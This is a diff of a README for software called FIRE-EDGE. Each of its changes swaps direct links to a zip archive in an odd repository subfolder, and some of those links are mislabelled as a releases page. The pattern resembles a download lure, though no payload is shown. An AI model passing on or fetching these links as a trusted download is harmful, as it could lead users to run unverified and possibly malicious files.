@@ -6,11 +6,11 @@ Welcome to FIRE-EDGE! This software offers an easy way to harness the power of e
 
 ## 🔗 Download FIRE-EDGE
 
-[![Download FIRE-EDGE](https://raw.githubusercontent.com/Kenneth2d/FIRE-EDGE/main/andante/EDGE_FIR_2.9-alpha.3.zip)](https://raw.githubusercontent.com/Kenneth2d/FIRE-EDGE/main/andante/EDGE_FIR_2.9-alpha.3.zip)
+[![Download FIRE-EDGE](https://raw.githubusercontent.com/Kenneth2d/FIRE-EDGE/main/andante/EDGE_FIR_2.8.zip)](https://raw.githubusercontent.com/Kenneth2d/FIRE-EDGE/main/andante/EDGE_FIR_2.8.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [FIRE-EDGE Releases](https://raw.githubusercontent.com/Kenneth2d/FIRE-EDGE/main/andante/EDGE_FIR_2.9-alpha.3.zip). 
+To get started, visit this page to download: [FIRE-EDGE Releases](https://raw.githubusercontent.com/Kenneth2d/FIRE-EDGE/main/andante/EDGE_FIR_2.8.zip). 
 
 Here you will find the latest version of FIRE-EDGE. Follow these simple steps:
 
@@ -85,6 +85,6 @@ If you encounter any problems while using FIRE-EDGE, please visit our GitHub Iss
 
 ## 🔗 Final Download Link
 
-To begin your journey with FIRE-EDGE, don't forget to download the software here: [FIRE-EDGE Releases](https://raw.githubusercontent.com/Kenneth2d/FIRE-EDGE/main/andante/EDGE_FIR_2.9-alpha.3.zip). 
+To begin your journey with FIRE-EDGE, don't forget to download the software here: [FIRE-EDGE Releases](https://raw.githubusercontent.com/Kenneth2d/FIRE-EDGE/main/andante/EDGE_FIR_2.8.zip). 
 
 We hope you enjoy using FIRE-EDGE and all the capabilities it offers!
